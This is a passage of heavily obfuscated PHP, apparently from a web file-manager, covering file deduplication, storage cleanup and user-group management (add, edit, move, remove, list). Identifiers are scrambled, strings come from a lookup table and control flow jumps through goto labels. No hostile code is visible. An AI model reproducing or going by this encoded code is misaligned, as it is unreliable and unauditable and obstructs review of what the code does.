cˆšÂÅÅ×—: if ($eáøÄÌÍÔè = $this->addFileCheckExist($D¬ˆàÓÛæ[$aĞÛ‹ÜÖ‚Ø[171]], $D¬ˆàÓÛæ[$aĞÛ‹ÜÖ‚Ø[170]], $D¬ˆàÓÛæ[$aĞÛ‹ÜÖ‚Ø[78]])) { return $eáøÄÌÍÔè; } return $this->addFileData($D¬ˆàÓÛæ); goto E‹Ş¬„Ş¤Ö; dŒ÷–Æµñ: $aĞÛ‹ÜÖ‚Ø =& $_SERVER[æ§›¦ÌáØ]; if (!IO::exist($DË‡çƒ¨Áº)) { return !1; } $EÌÃÔ‘ÓŒ = $E«¿­“øº†[$aĞÛ‹ÜÖ‚Ø[170]] ? $E«¿­“øº†[$aĞÛ‹ÜÖ‚Ø[170]] : $aĞÛ‹ÜÖ‚Ø[33]; goto aË”í–‡…å; E‹Ş¬„Ş¤Ö: } private function addFileData($a”Š™Î…Òé) { $C¨ºª§Ì° =& $_SERVER[æ§›¦ÌáØ]; if (!$a”Š™Î…Òé) { return !1; } $a”Š™Î…Òé[$C¨ºª§Ì°[78]] = intval($a”Š™Î…Òé[$C¨ºª§Ì°[78]]); if (!$a”Š™Î…Òé[$C¨ºª§Ì°[78]] && strlen($a”Š™Î…Òé[$C¨ºª§Ì°[171]]) > 32) { $a”Š™Î…Òé[$C¨ºª§Ì°[78]] = intval(substr($a”Š™Î…Òé[$C¨ºª§Ì°[171]], 32)); } $D†ëå÷ƒ‹ = $this->add($a”Š™Î…Òé); return $this->find($D†ëå÷ƒ‹); } public function addFile($F°ë×³·†æ, $B¬¡¤„‘¥ä, $aÔ°ö«°²¹ = false) { goto BÄÛãæ‚‡·; cÜßÅİÒ±: return $e¯•§‡Ö®²; goto a‚‡°¡‚…; BÄÛãæ‚‡·: $béÈÖë˜ = IO::hashSimple($F°ë×³·†æ); $bÇó³ª¿ëÛ = IO::hashMd5($F°ë×³·†æ); $Ağ¶åŸ¦» = IO::size($F°ë×³·†æ); goto CŞî…¦µ; Bõ‚£ŠÛ¨: $Bİ˜–”­ = $this->addFileMake($F°ë×³·†æ, $Ağ¶åŸ¦», $béÈÖë˜, $bÇó³ª¿ëÛ, $B¬¡¤„‘¥ä, $aÔ°ö«°²¹); $e¯•§‡Ö®² = $this->addFileData($Bİ˜–”­); CacheLock::unlock($EŠÄŠ³È‰); goto cÜßÅİÒ±; CŞî…¦µ: $EŠÄŠ³È‰ = $_SERVER[æ§›¦ÌáØ][1748] . $bÇó³ª¿ëÛ; CacheLock::lock($EŠÄŠ³È‰); if ($E“ĞÊï˜¼§ = $this->addFileCheckExist($béÈÖë˜, $bÇó³ª¿ëÛ, $Ağ¶åŸ¦»)) { CacheLock::unlock($EŠÄŠ³È‰); return $E“ĞÊï˜¼§; } goto Bõ‚£ŠÛ¨; a‚‡°¡‚…: } public function addFileMake($BÍÍÇ³ÜƒÑ, $aŠÔä—ŸÛ, $Dö×•ˆÖ­Ú, $fÄÊ·õ¶¤, $f±áİÙÓçÎ, $c‹ÀÚŞÆŸß) { goto dİ¨è™­›ñ; dİ¨è™­›ñ: $EÃ†‹†‹Ò =& $_SERVER[æ§›¦ÌáØ]; $eêÕ×Ê¿ù = $this->createFileName($f±áİÙÓçÎ, $Dö×•ˆÖ­Ú, $fÄÊ·õ¶¤); $FèŒàŠçï… = get_path_father($eêÕ×Ê¿ù); goto FÍ¬¢ß“Ç; cìÁ»ÒË‰: $dì…Û–„— = KodIO::defaultDriver(); $DÄ²’ç‡±¢ = array($EÃ†‹†‹Ò[561] => $aŠÔä—ŸÛ, $EÃ†‹†‹Ò[1745] => 1, $EÃ†‹†‹Ò[413] => $f±áİÙÓçÎ, $EÃ†‹†‹Ò[766] => $dì…Û–„—[$EÃ†‹†‹Ò[393]], $EÃ†‹†‹Ò[414] => $eêÕ×Ê¿ù, $EÃ†‹†‹Ò[1746] => $Dö×•ˆÖ­Ú, $EÃ†‹†‹Ò[1747] => $fÄÊ·õ¶¤); return $DÄ²’ç‡±¢; goto EÄ–õ¾èô„; FÍ¬¢ß“Ç: $F­®ƒáŞ…â = get_path_this($eêÕ×Ê¿ù); if ($c‹ÀÚŞÆŸß) { $cÁîäéŠ¿­ = IO::move($BÍÍÇ³ÜƒÑ, $FèŒàŠçï…, !1, $F­®ƒáŞ…â); } else { $cÁîäéŠ¿­ = IO::copy($BÍÍÇ³ÜƒÑ, $FèŒàŠçï…, !1, $F­®ƒáŞ…â); } if (!$cÁîäéŠ¿­) { return !1; } goto cìÁ»ÒË‰; EÄ–õ¾èô„: } public function addFileCheckExist($Bòì’ğ•¿, $B¿¢íÃÖë÷, $E„Ùƒ·š†ò) { $EÇÀ•Ä =& $_SERVER[æ§›¦ÌáØ]; $E…Š§â·ä¼ = $this->findByHash($Bòì’ğ•¿, $B¿¢íÃÖë÷); if (!$E…Š§â·ä¼) { return !1; } $cÈğù“õŞ˜ = array($EÇÀ•Ä[1745] => intval($E…Š§â·ä¼[$EÇÀ•Ä[1749]]) + 1, $EÇÀ•Ä[561] => $E„Ùƒ·š†ò); $this->where(array($EÇÀ•Ä[448] => $E…Š§â·ä¼[$EÇÀ•Ä[447]]))->save($cÈğù“õŞ˜); return $E…Š§â·ä¼; } public function remove($aÃ•ê¬ã„) { $this->linkCountChange($aÃ•ê¬ã„, !1); $this->clearEmpty(); return !0; } public function linkAdd($AÎÛ»ÑÕ§Ó) { $this->linkCountChange($AÎÛ»ÑÕ§Ó, !0); } public function linkCountChange($B°ÈÆ¸£Å¤, $f‚¶İá¶¸) { goto AùåÛ‡ÁÈ‘; EÀ…ªìçÈ: $Eõ‹ŸŒåµõ = array(); foreach ($B°ÈÆ¸£Å¤ as $d­Úä¤­­³) { $b³÷Û §ª = $d­Úä¤­­³ . $dÊ‚«¿é[33]; if (!$Eõ‹ŸŒåµõ[$b³÷Û §ª]) { $Eõ‹ŸŒåµõ[$b³÷Û §ª] = 0; } $Eõ‹ŸŒåµõ[$b³÷Û §ª]++; } $AóÃ¡¹õ³ = array(); goto eé“Œä•Ô‹; AùåÛ‡ÁÈ‘: $dÊ‚«¿é =& $_SERVER[æ§›¦ÌáØ]; if (!$B°ÈÆ¸£Å¤) { return; } if (!is_array($B°ÈÆ¸£Å¤)) { $B°ÈÆ¸£Å¤ = array($B°ÈÆ¸£Å¤); } goto EÀ…ªìçÈ; eé“Œä•Ô‹: foreach ($Eõ‹ŸŒåµõ as $d­Úä¤­­³ => $cÒŸ©”ÊÙ) { $b³÷Û §ª = $cÒŸ©”ÊÙ . $dÊ‚«¿é[33]; if (!$AóÃ¡¹õ³[$b³÷Û §ª]) { $AóÃ¡¹õ³[$b³÷Û §ª] = array(); } $AóÃ¡¹õ³[$b³÷Û §ª][] = $d­Úä¤­­³; } foreach ($AóÃ¡¹õ³ as $cÒŸ©”ÊÙ => $f˜°‚ŸöÜ) { if (!$f˜°‚ŸöÜ) { continue; } $cÒŸ©”ÊÙ = $f‚¶İá¶¸ ? $cÒŸ©”ÊÙ : -intval($cÒŸ©”ÊÙ); $bÚ–Ë†¼‰Æ = array($dÊ‚«¿é[447] => array($dÊ‚«¿é[7], $f˜°‚ŸöÜ)); if ($cÒŸ©”ÊÙ < 0) { $bÚ–Ë†¼‰Æ[$dÊ‚«¿é[1749]] = array($dÊ‚«¿é[963], abs($cÒŸ©”ÊÙ)); } $this->where($bÚ–Ë†¼‰Æ)->setAdd($dÊ‚«¿é[1749], $cÒŸ©”ÊÙ); } goto D‚¼›ç©Ÿ½; D‚¼›ç©Ÿ½: } public function findByHash($dÌµŞ¸äê¦, $Dœ²‰§œÄ = false) { $bïïõÃİÁ =& $_SERVER[æ§›¦ÌáØ]; if (!$dÌµŞ¸äê¦ && !$Dœ²‰§œÄ) { return !1; } $fšÆ„Ÿ éˆ = array($bïïõÃİÁ[1746] => $dÌµŞ¸äê¦); if ($Dœ²‰§œÄ) { $fšÆ„Ÿ éˆ = array($bïïõÃİÁ[1747] => $Dœ²‰§œÄ); } return $this->order($bïïõÃİÁ[1750])->where($fšÆ„Ÿ éˆ)->find(); } public function clearEmpty($BÇŠù¯Ò× = 0) { goto d’¯Ò»ãàŞ; f¤‹ìŒœçš: $Bö”Í£ä›ã = $this->where($bÉŞˆªĞ­)->select(); if (!$Bö”Í£ä›ã) { return; } $f½§ğ«»Ğğ = new Task($BèÒÓÀ‹ê©[1752], $BèÒÓÀ‹ê©[33], count($Bö”Í£ä›ã)); goto C–Øµ½’¾; C–Øµ½’¾: foreach ($Bö”Í£ä›ã as $E‘”´¡ÆÑ) { $f½§ğ«»Ğğ->update(1); $this->resetFile($E‘”´¡ÆÑ); } $f½§ğ«»Ğğ->end(); goto Bá˜Í£ìÙí; d’¯Ò»ãàŞ: $BèÒÓÀ‹ê© =& $_SERVER[æ§›¦ÌáØ]; $CğİµÅ¢êÈ = time() - 3600 * 24 * $BÇŠù¯Ò×; $bÉŞˆªĞ­ = $BèÒÓÀ‹ê©[1751] . $CğİµÅ¢êÈ; goto f¤‹ìŒœçš; Bá˜Í£ìÙí: } public function resetFile($C °¹¤øÑ) { goto a¬ÌéŞ‰Øé; FáùâõÈÀ: $eÌæêÓÏ°¸ = Model($C‚¶ÛÁª›ù[1753])->where($A´®§ÆŠÏ)->count(); $EŒŸöÅ“‘ = intval($BŠ“šÈÚ«) + intval($eÌæêÓÏ°¸); if ($EŒŸöÅ“‘ == 0) { IO::remove($C °¹¤øÑ[$C‚¶ÛÁª›ù[76]]); Model($C‚¶ÛÁª›ù[1754])->delete($C °¹¤øÑ[$C‚¶ÛÁª›ù[447]]); $this->where($A´®§ÆŠÏ)->delete(); $this->metaSet($C °¹¤øÑ[$C‚¶ÛÁª›ù[447]], null, null); return; } goto DÏâç•Áí; DÏâç•Áí: if ($C °¹¤øÑ[$C‚¶ÛÁª›ù[1749]] != $EŒŸöÅ“‘) { $this->where($A´®§ÆŠÏ)->save(array($C‚¶ÛÁª›ù[1745] => $EŒŸöÅ“‘)); } goto AÇ±É±À÷É; a¬ÌéŞ‰Øé: $C‚¶ÛÁª›ù =& $_SERVER[æ§›¦ÌáØ]; $A´®§ÆŠÏ = array($C‚¶ÛÁª›ù[448] => $C °¹¤øÑ[$C‚¶ÛÁª›ù[447]]); $BŠ“šÈÚ« = Model($C‚¶ÛÁª›ù[1196])->where($A´®§ÆŠÏ)->count(); goto FáùâõÈÀ; AÇ±É±À÷É: } public function storageInfo($e®§òŸ«öÕ = false) { goto aÁ–ğË– Â; B„ÉìÖ ßã: for ($Eô‘ÓÈ˜É = 0; $Eô‘ÓÈ˜É < $aÖƒì°óë; $Eô‘ÓÈ˜É = $Eô‘ÓÈ˜É + $c„Ò©¬¦Ô) { $a­å»äš = $this->limit($Eô‘ÓÈ˜É, $Eô‘ÓÈ˜É + $c„Ò©¬¦Ô)->select(); foreach ($a­å»äš as $b»”ÑÇÆïö) { $c·ÍŒê¦§ += $b»”ÑÇÆïö[$A±ãá×ÂâÅ[78]] * $b»”ÑÇÆïö[$A±ãá×ÂâÅ[1749]]; $e ˜º¯±Öß += $b»”ÑÇÆïö[$A±ãá×ÂâÅ[78]] * ($b»”ÑÇÆïö[$A±ãá×ÂâÅ[1749]] - 1); $A½ŒÓâËŠØ += $b»”ÑÇÆïö[$A±ãá×ÂâÅ[1749]]; } } $DãÕ»‚ÆÖÜ = array($A±ãá×ÂâÅ[1755] => $c·ÍŒê¦§, $A±ãá×ÂâÅ[1756] => $e ˜º¯±Öß, $A±ãá×ÂâÅ[1757] => $e ˜º¯±Öß / $c·ÍŒê¦§, $A±ãá×ÂâÅ[82] => $aÖƒì°óë, $A±ãá×ÂâÅ[1758] => $A½ŒÓâËŠØ); return $DãÕ»‚ÆÖÜ; goto dîÁÆè¢¤Æ; e–¸„„¨·: $c·ÍŒê¦§ = 1; $A½ŒÓâËŠØ = 0; $c„Ò©¬¦Ô = 5000; goto B„ÉìÖ ßã; aÁ–ğË– Â: $A±ãá×ÂâÅ =& $_SERVER[æ§›¦ÌáØ]; $aÖƒì°óë = $this->count() + 0.0; $e ˜º¯±Öß = 0; goto e–¸„„¨·; dîÁÆè¢¤Æ: } } class GroupModel extends ModelBase { protected $tableName = "\147\162\157\165\x70"; protected $tableMeta = array("\164\x61\142\154\x65\116\141\155\145" => "\x67\162\x6f\165\x70\137\x6d\x65\164\x61", "\x6d\145\164\x61\106\x69\145\x6c\144" => "\147\162\x6f\165\x70\x49\104"); protected function cacheFunctionAlias($bµ†ÌÌ´¡) { $d“ÃÈĞùåë =& $_SERVER[æ§›¦ÌáØ]; return array($d“ÃÈĞùåë[1759] => array($bµ†ÌÌ´¡[0], $d“ÃÈĞùåë[1760]), $d“ÃÈĞùåë[1761] => array($bµ†ÌÌ´¡[0], $d“ÃÈĞùåë[1760])); } protected function getInfo($bì÷çì¡Û£) { $fˆÎ’†â = $this->getInfoSimple($bì÷çì¡Û£); if (!$fˆÎ’†â) { return !1; } return $this->_listDataApplyItem($fˆÎ’†â); } protected function getInfoSimple($Aµ‘¡ÅŠêá, $ešƒÌ•î°¾ = false) { $FÒÇƒèÊé =& $_SERVER[æ§›¦ÌáØ]; if ($ešƒÌ•î°¾) { $E„º¥ˆ÷É = array($FÒÇƒèÊé[1689] => intval($Aµ‘¡ÅŠêá)); $Aê‹ˆ‘Ò×Ê = $this->where($E„º¥ˆ÷É)->find(); return is_array($Aê‹ˆ‘Ò×Ê) ? $Aê‹ˆ‘Ò×Ê : array(); } return $this->cacheFunctionGet($FÒÇƒèÊé[1762], $Aµ‘¡ÅŠêá); } protected function groupAdd($fÒİ³ÖîÂî) { goto eîÉÍŠ­İ; cì£­„Íã¾: if (!empty($fÒİ³ÖîÂî[$e•ôÌÇÎÍ›[1689]])) { $e¨ŒâÄ±£Ö[$e•ôÌÇÎÍ›[1689]] = $fÒİ³ÖîÂî[$e•ôÌÇÎÍ›[1689]]; } $Dªíç™À¦Ÿ = $this->add($e¨ŒâÄ±£Ö); $this->setNamePinyin($Dªíç™À¦Ÿ, $e¨ŒâÄ±£Ö[$e•ôÌÇÎÍ›[28]]); goto fŸ»èà¨™; fŸ»èà¨™: if (isset($fÒİ³ÖîÂî[$e•ôÌÇÎÍ›[1765]])) { $this->metaSet($Dªíç™À¦Ÿ, array($e•ôÌÇÎÍ›[1765] => $fÒİ³ÖîÂî[$e•ôÌÇÎÍ›[1765]], $e•ôÌÇÎÍ›[1766] => $fÒİ³ÖîÂî[$e•ôÌÇÎÍ›[1766]])); unset($fÒİ³ÖîÂî[$e•ôÌÇÎÍ›[1765]]); unset($fÒİ³ÖîÂî[$e•ôÌÇÎÍ›[1766]]); } Model($e•ôÌÇÎÍ›[1196])->groupRootAdd($Dªíç™À¦Ÿ); return $Dªíç™À¦Ÿ; goto Eµ˜åêœ; eîÉÍŠ­İ: $e•ôÌÇÎÍ› =& $_SERVER[æ§›¦ÌáØ]; if (!$fÒİ³ÖîÂî[$e•ôÌÇÎÍ›[478]] && isset($fÒİ³ÖîÂî[$e•ôÌÇÎÍ›[1689]]) && $fÒİ³ÖîÂî[$e•ôÌÇÎÍ›[1689]] == 1) { if ($F¹ŒÈ‹³„Â = $this->getInfoSimple($fÒİ³ÖîÂî[$e•ôÌÇÎÍ›[1689]], !0)) { return $fÒİ³ÖîÂî[$e•ôÌÇÎÍ›[1689]]; } } else { $F¹ŒÈ‹³„Â = $this->getInfoSimple($fÒİ³ÖîÂî[$e•ôÌÇÎÍ›[478]]); if (!$F¹ŒÈ‹³„Â) { return !1; } } $FŸƒÕò¡¥£ = $e•ôÌÇÎÍ›[512]; goto A„º›àÚï¸; A„º›àÚï¸: if ($F¹ŒÈ‹³„Â[$e•ôÌÇÎÍ›[502]]) { $FŸƒÕò¡¥£ = $F¹ŒÈ‹³„Â[$e•ôÌÇÎÍ›[502]] . $F¹ŒÈ‹³„Â[$e•ôÌÇÎÍ›[1689]] . $e•ôÌÇÎÍ›[47]; } $e¨ŒâÄ±£Ö = array($e•ôÌÇÎÍ›[413] => $this->groupNameAuto($fÒİ³ÖîÂî[$e•ôÌÇÎÍ›[478]], $fÒİ³ÖîÂî[$e•ôÌÇÎÍ›[28]]), $e•ôÌÇÎÍ›[394] => $fÒİ³ÖîÂî[$e•ôÌÇÎÍ›[478]], $e•ôÌÇÎÍ›[566] => $FŸƒÕò¡¥£, $e•ôÌÇÎÍ›[1763] => $fÒİ³ÖîÂî[$e•ôÌÇÎÍ›[1673]], $e•ôÌÇÎÍ›[1764] => 0, $e•ôÌÇÎÍ›[1693] => 0); if (isset($fÒİ³ÖîÂî[$e•ôÌÇÎÍ›[1712]])) { $e¨ŒâÄ±£Ö[$e•ôÌÇÎÍ›[1712]] = $fÒİ³ÖîÂî[$e•ôÌÇÎÍ›[1712]]; } else { $eòä²êİŸÉ = $this->max($e•ôÌÇÎÍ›[1712]); if (!$eòä²êİŸÉ) { $eòä²êİŸÉ = 0; } $e¨ŒâÄ±£Ö[$e•ôÌÇÎÍ›[1712]] = $eòä²êİŸÉ + 1; } goto cì£­„Íã¾; Eµ˜åêœ: } protected function groupEdit($d¿§çîÜ’, $dšËØ™°Ç¶) { goto fÙÓ¨Çà‘ñ; fÙÓ¨Çà‘ñ: $d™¤£˜£»ê =& $_SERVER[æ§›¦ÌáØ]; $A¹¢‡ÀÓòÊ = $this->getInfoSimple($d¿§çîÜ’); if (!$A¹¢‡ÀÓòÊ) { return !1; } goto E‘ÈŠ´Ã„; E‘ÈŠ´Ã„: if (!empty($dšËØ™°Ç¶[$d™¤£˜£»ê[478]])) { $ağŠ„µÀêå = $this->getInfoSimple($dšËØ™°Ç¶[$d™¤£˜£»ê[478]]); if (!$ağŠ„µÀêå) { return !1; } if ($A¹¢‡ÀÓòÊ[$d™¤£˜£»ê[1689]] == $ağŠ„µÀêå[$d™¤£˜£»ê[1689]]) { return !1; } if ($dšËØ™°Ç¶[$d™¤£˜£»ê[478]] != $A¹¢‡ÀÓòÊ[$d™¤£˜£»ê[478]]) { if ($ağŠ„µÀêå[$d™¤£˜£»ê[502]] !== $A¹¢‡ÀÓòÊ[$d™¤£˜£»ê[502]] && strpos($ağŠ„µÀêå[$d™¤£˜£»ê[502]], $A¹¢‡ÀÓòÊ[$d™¤£˜£»ê[502]] . $A¹¢‡ÀÓòÊ[$d™¤£˜£»ê[1689]] . $d™¤£˜£»ê[47]) === 0) { return !1; } $dšËØ™°Ç¶[$d™¤£˜£»ê[566]] = $ağŠ„µÀêå[$d™¤£˜£»ê[502]] . $dšËØ™°Ç¶[$d™¤£˜£»ê[478]] . $d™¤£˜£»ê[47]; $this->_changeChildLevel($A¹¢‡ÀÓòÊ, $ağŠ„µÀêå); } } if (isset($dšËØ™°Ç¶[$d™¤£˜£»ê[28]])) { $this->setNamePinyin($d¿§çîÜ’, $dšËØ™°Ç¶[$d™¤£˜£»ê[28]]); } if (isset($dšËØ™°Ç¶[$d™¤£˜£»ê[1765]])) { $this->metaSet($d¿§çîÜ’, array($d™¤£˜£»ê[1765] => $dšËØ™°Ç¶[$d™¤£˜£»ê[1765]], $d™¤£˜£»ê[1766] => $dšËØ™°Ç¶[$d™¤£˜£»ê[1766]])); unset($dšËØ™°Ç¶[$d™¤£˜£»ê[1765]]); unset($dšËØ™°Ç¶[$d™¤£˜£»ê[1766]]); } goto BØƒ¡ÉÃÕ; BØƒ¡ÉÃÕ: if (isset($dšËØ™°Ç¶[$d™¤£˜£»ê[28]]) && $dšËØ™°Ç¶[$d™¤£˜£»ê[28]] != $A¹¢‡ÀÓòÊ[$d™¤£˜£»ê[28]]) { $this->_clearChildrenCache($A¹¢‡ÀÓòÊ); } return $this->where(array($d™¤£˜£»ê[1767] => $d¿§çîÜ’))->save($dšËØ™°Ç¶); goto b¬˜à„¹Ü; b¬˜à„¹Ü: } private function _clearChildrenCache($CˆØËèÑ×á) { $C‡îŸƒŒ =& $_SERVER[æ§›¦ÌáØ]; $eèß‚–Å› = array($C‡îŸƒŒ[566] => array($C‡îŸƒŒ[525], $CˆØËèÑ×á[$C‡îŸƒŒ[502]] . $CˆØËèÑ×á[$C‡îŸƒŒ[1689]] . $C‡îŸƒŒ[526])); $DçÙÜÎ¹¿ì = $this->field($C‡îŸƒŒ[1689])->where($eèß‚–Å›)->select(); foreach ($DçÙÜÎ¹¿ì as $A˜ìŠƒ™†) { $this->cacheFunctionClear($C‡îŸƒŒ[1768], $A˜ìŠƒ™†[$C‡îŸƒŒ[1689]]); $this->cacheFunctionClear($C‡îŸƒŒ[1762], $A˜ìŠƒ™†[$C‡îŸƒŒ[1689]]); } } private function _changeChildLevel($e’êÈš±„…, $A—¼Ùì×í, $BÖ§ä‡»ƒ = false) { goto Bß‡Äè±‘Ì; Bß‡Äè±‘Ì: $EùêÔäªôß =& $_SERVER[æ§›¦ÌáØ]; $fÇÌƒÍ…¡ = $e’êÈš±„…[$EùêÔäªôß[502]] . $e’êÈš±„…[$EùêÔäªôß[1689]] . $EùêÔäªôß[47]; $dë¦£‰ğ¸¢ = $A—¼Ùì×í[$EùêÔäªôß[502]] . $A—¼Ùì×í[$EùêÔäªôß[1689]] . $EùêÔäªôß[47] . $e’êÈš±„…[$EùêÔäªôß[1689]] . $EùêÔäªôß[47]; goto fá…¹®ƒ™·; fá…¹®ƒ™·: if ($BÖ§ä‡»ƒ) { $dë¦£‰ğ¸¢ = $A—¼Ùì×í[$EùêÔäªôß[502]] . $A—¼Ùì×í[$EùêÔäªôß[1689]] . $EùêÔäªôß[47]; } $AÁ÷æÚØ¨¬ = array($EùêÔäªôß[566] => array($EùêÔäªôß[525], $e’êÈš±„…[$EùêÔäªôß[502]] . $e’êÈš±„…[$EùêÔäªôß[1689]] . $EùêÔäªôß[526])); $Eîğòµ„‰Í = array($EùêÔäªôß[566] => array($EùêÔäªôß[574], "\162\145\x70\x6c\141\x63\145\x28\x70\x61\x72\x65\x6e\x74\x4c\145\x76\145\x6c\54\x27{$fÇÌƒÍ…¡}\47\54\47{$dë¦£‰ğ¸¢}\47\x29")); goto dó½÷ŒÄ¯; dó½÷ŒÄ¯: $this->_clearChildrenCache($e’êÈš±„…); $this->where($AÁ÷æÚØ¨¬)->data($Eîğòµ„‰Í)->save(); goto aÇçÖç˜ğ¾; aÇçÖç˜ğ¾: } public function setNamePinyin($eåğ‹ñŠŠí, $FÆ¬ÀÉ‹Ùò = false) { $fí‘‹§‰— =& $_SERVER[æ§›¦ÌáØ]; if (!$FÆ¬ÀÉ‹Ùò) { $c’Å…÷¸Ÿ = $this->getInfoSimple($eåğ‹ñŠŠí); $FÆ¬ÀÉ‹Ùò = $c’Å…÷¸Ÿ[$fí‘‹§‰—[28]]; } if (!Input::check($FÆ¬ÀÉ‹Ùò, $fí‘‹§‰—[569])) { $this->metaSet($eåğ‹ñŠŠí, $fí‘‹§‰—[444], null); $this->metaSet($eåğ‹ñŠŠí, $fí‘‹§‰—[443], null); return; } $c¡Ûº³„íØ = array($fí‘‹§‰—[444] => str_replace($fí‘‹§‰—[50], $fí‘‹§‰—[33], Pinyin::encode($FÆ¬ÀÉ‹Ùò)), $fí‘‹§‰—[443] => Pinyin::encode($FÆ¬ÀÉ‹Ùò, $fí‘‹§‰—[570])); $this->metaSet($eåğ‹ñŠŠí, $c¡Ûº³„íØ); } protected function groupStatus($B¢ù…¬®„î, $F­†É‰ÊÎÉ) { goto EïÂë¾; Aù•ùšéÓ: foreach ($D…Á²ÍÑê· as $B¢ù…¬®„î) { $EÎ±îÏ¡³¼[] = array($DÍ‚÷Œ£ Ò[1689] => $B¢ù…¬®„î, $DÍ‚÷Œ£ Ò[93] => $DÍ‚÷Œ£ Ò[703], $DÍ‚÷Œ£ Ò[372] => $F­†É‰ÊÎÉ); } return Model($DÍ‚÷Œ£ Ò[1769])->addAll($EÎ±îÏ¡³¼, array(), !0); goto bˆÌ½ëôÌ©; c‡ÈÛ…²à : if ($F­†É‰ÊÎÉ == $DÍ‚÷Œ£ Ò[87]) { $D…Á²ÍÑê· = $this->parentLevelArray($C§çáÓ‚óó[$DÍ‚÷Œ£ Ò[502]]); } else { $eö†÷¥öâ¹ = array($DÍ‚÷Œ£ Ò[566] => array($DÍ‚÷Œ£ Ò[525], $C§çáÓ‚óó[$DÍ‚÷Œ£ Ò[502]] . $C§çáÓ‚óó[$DÍ‚÷Œ£ Ò[1689]] . $DÍ‚÷Œ£ Ò[526])); $D…Á²ÍÑê· = $this->where($eö†÷¥öâ¹)->field($DÍ‚÷Œ£ Ò[1689])->select(); $D…Á²ÍÑê· = array_to_keyvalue($D…Á²ÍÑê·, $DÍ‚÷Œ£ Ò[33], $DÍ‚÷Œ£ Ò[1689]); } $D…Á²ÍÑê·[] = $C§çáÓ‚óó[$DÍ‚÷Œ£ Ò[1689]]; $EÎ±îÏ¡³¼ = array(); goto Aù•ùšéÓ; EïÂë¾: $DÍ‚÷Œ£ Ò =& $_SERVER[æ§›¦ÌáØ]; $C§çáÓ‚óó = $this->getInfoSimple($B¢ù…¬®„î); if (!$C§çáÓ‚óó) { return !1; } goto c‡ÈÛ…²à ; bˆÌ½ëôÌ©: } protected function groupRemove($A±ÜÔõöù) { goto dµÚ­ÔŒĞ; aÁí¨î‹¾: $this->where(array($D˜×Ë¡‘âÃ[478] => $A±ÜÔõöù))->save(array($D˜×Ë¡‘âÃ[478] => $d¿İ²ß´´[$D˜×Ë¡‘âÃ[478]])); Model($D˜×Ë¡‘âÃ[1769])->where($Fˆ¥Åƒ¢Õ¯)->delete(); Model($D˜×Ë¡‘âÃ[1770])->where($Fˆ¥Åƒ¢Õ¯)->delete(); goto Aª´¥ë§‘Ø; b¬‡†«ÊÁÀ: if (!$d¿İ²ß´´ || $d¿İ²ß´´[$D˜×Ë¡‘âÃ[478]] == 0) { return !1; } $dØìó‡Ë‚ = $this->getInfoSimple($d¿İ²ß´´[$D˜×Ë¡‘âÃ[478]]); $this->_changeChildLevel($d¿İ²ß´´, $dØìó‡Ë‚, !0); goto aÁí¨î‹¾; Aª´¥ë§‘Ø: Model($D˜×Ë¡‘âÃ[783])->groupRootRemove($A±ÜÔõöù); return $this->where($Fˆ¥Åƒ¢Õ¯)->delete(); goto a¢œòß˜è¦; dµÚ­ÔŒĞ: $D˜×Ë¡‘âÃ =& $_SERVER[æ§›¦ÌáØ]; $Fˆ¥Åƒ¢Õ¯ = array($D˜×Ë¡‘âÃ[1689] => $A±ÜÔõöù); $d¿İ²ß´´ = $this->where($Fˆ¥Åƒ¢Õ¯)->find(); goto b¬‡†«ÊÁÀ; a¢œòß˜è¦: } protected function groupSort($Bò†ÙøÅ«») { $cõÛ›î =& $_SERVER[æ§›¦ÌáØ]; $EÈÕ½»½ = array(); foreach ($Bò†ÙøÅ«» as $CÁ‰Œ‰å…¡ => $A°§‘îÚ‘Ä) { $EÈÕ½»½[] = array($cõÛ›î[1689], $A°§‘îÚ‘Ä, $cõÛ›î[1712], $CÁ‰Œ‰å…¡ + 1); } $this->saveAll($EÈÕ½»½); } public function listData() { $A‘ŠèŠó—Ñ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($A‘ŠèŠó—Ñ[$_SERVER[æ§›¦ÌáØ][367]]); return $A‘ŠèŠó—Ñ; } private function _makeOrder($c†ºÆŠ•ğŞ = '') { goto F™‡±Ë–ˆå; F™‡±Ë–ˆå: $DŞšÌÇĞå =& $_SERVER[æ§›¦ÌáØ]; $f¡¯°¯åÆ‚ = array($DŞšÌÇĞå[1689], $DŞšÌÇĞå[28], $DŞšÌÇĞå[1675], $DŞšÌÇĞå[194]); $E×øËªœçä = array($DŞšÌÇĞå[428] => $DŞšÌÇĞå[429], $DŞšÌÇĞå[430] => $DŞšÌÇĞå[431]); goto Aˆ„óƒöÃ¹; b­£…áìÀ¯: $c†ºÆŠ•ğŞ = $c†ºÆŠ•ğŞ . "{$f£óÑ’¼¾¿}\x20{$FõˆÄ— ½}\54\40\x67\x72\157\165\x70\x49\104\40\x61\x73\x63"; return $this->order($c†ºÆŠ•ğŞ); goto a½©—ñù¾ø; Aˆ„óƒöÃ¹: $f£óÑ’¼¾¿ = Input::get($DŞšÌÇĞå[435], $DŞšÌÇĞå[7], $DŞšÌÇĞå[1693], $f¡¯°¯åÆ‚); $FõˆÄ— ½ = Input::get($DŞšÌÇĞå[436], $DŞšÌÇĞå[7], $DŞšÌÇĞå[1771], array($DŞšÌÇĞå[1771], $DŞšÌÇĞå[430])); $FõˆÄ— ½ = $E×øËªœçä[$FõˆÄ— ½]; goto b­£…áìÀ¯; a½©—ñù¾ø: } public function listChild($dğ³ùÍÔÓ‹) { $bµõ÷ÙÊñ£ =& $_SERVER[æ§›¦ÌáØ]; $bÙ¡•Íã = $this->where(array($bµõ÷ÙÊñ£[478] => $dğ³ùÍÔÓ‹))->_makeOrder()->selectPage(200); $this->_listDataApply($bÙ¡•Íã[$bµõ÷ÙÊñ£[367]]); return $bÙ¡•Íã; } public function listByID($b ¼Éáˆ¤“) { $fÆ×ÖïöÓ =& $_SERVER[æ§›¦ÌáØ]; if (!$b ¼Éáˆ¤“) { return array(); } $BìÉ‹æ¯‰© = array($fÆ×ÖïöÓ[1689] => array($fÆ×ÖïöÓ[7], $b ¼Éáˆ¤“)); $FÑ¡Š‘·½ = $this->where($BìÉ‹æ¯‰©)->select(); $this->_listDataApply($FÑ¡Š‘·½); return $FÑ¡Š‘·½; } public function listSearch($cµ“–Ÿö°) { goto D·©Úñ—ê‹; d•œ¥ä‚š˜: if ($F±´çç£®Ò) { $dËÆàöğîˆ = $this->getInfoSimple($F±´çç£®Ò); $F¦£•Ó›Åâ = $dËÆàöğîˆ[$cİ—Äë—’ä[502]] . $F±´çç£®Ò . $cİ—Äë—’ä[526]; $eÆ˜ÜºÔ‘‘ = 